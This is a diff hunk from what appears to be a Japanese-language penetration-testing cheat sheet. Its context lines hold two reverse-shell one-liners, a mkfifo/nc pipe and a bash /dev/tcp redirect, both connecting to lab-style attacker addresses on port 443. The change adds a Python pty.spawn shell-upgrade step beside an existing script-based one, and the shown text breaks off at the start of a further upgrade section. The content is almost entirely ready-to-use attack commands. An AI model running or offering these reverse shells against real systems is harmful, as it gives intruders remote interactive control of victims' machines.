@@ -13,11 +13,14 @@ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.19 443 >/tmp/f
 ```sh
 bash -i >& /dev/tcp/10.10.14.14/443 0>&1
 ```
-## シェルのアップグレード
+## シェルのアップグレード(script)
 ```sh
 script /dev/null -c bash
 ```
-
+## シェルのアップグレード(python)
+```sh
+python -c 'import pty;pty.spawn("/bin/bash")'
+```
 ## シェルをさらにアップグレード
 ```sh
 (Ctrl + z)
